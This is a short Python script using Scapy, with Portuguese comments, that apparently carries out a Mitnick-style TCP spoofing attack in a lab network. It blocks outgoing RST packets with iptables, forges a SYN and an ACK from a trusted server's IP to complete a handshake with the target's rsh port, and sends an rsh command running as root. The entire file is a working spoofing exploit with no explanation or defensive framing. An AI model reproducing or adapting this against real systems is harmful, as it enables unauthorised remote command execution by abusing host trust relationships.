from scapy.all import *
from time import sleep
import subprocess

# Configurações de rede
attacker_ip = "10.9.0.1"
xterminal_ip = "10.9.0.5"
trusted_server_ip = "10.9.0.6"

# Porta de origem e destino
src_port = 1023
dst_port = 514


def bloqueia_RST():
    comando = f"iptables -A OUTPUT -p tcp --tcp-flags RST RST --sport {src_port} -j DROP"
    subprocess.run(comando, shell=True, text=True)

def envia_SYN(seq):
    ip = IP()
    ip.src = trusted_server_ip
    ip.dst = xterminal_ip

    tcp = TCP()
    tcp.seq = seq
    tcp.sport = src_port
    tcp.dport = dst_port
    tcp.flags = "S"

    pacote = ip / tcp

    return sr1(pacote)

def envia_ACK(seq, ack):
    ip = IP()
    ip.src = trusted_server_ip
    ip.dst = xterminal_ip

    tcp = TCP()
    tcp.seq = seq
    tcp.ack = ack
    tcp.sport = src_port
    tcp.dport = dst_port
    tcp.flags = "A"

    pacote = ip / tcp

    send(pacote)


def envia_RSH(seq, ack):
    ip = IP()
    ip.src = trusted_server_ip
    ip.dst = xterminal_ip

    tcp = TCP()
    tcp.seq = seq
    tcp.ack = ack
    tcp.sport = src_port
    tcp.dport = dst_port
    tcp.flags = "PA"

    rsh_command = b"\x00root\x00root\x00ls\x00"

    pacote = ip / tcp / rsh_command

    send(pacote)

bloqueia_RST()

seq = 123

resposta = envia_SYN(seq)
resposta.show()

sleep(0.5)

ack = resposta.seq + 1
seq = seq + 1
envia_ACK(seq, ack)

resposta = envia_RSH(seq, ack)
# resposta.show()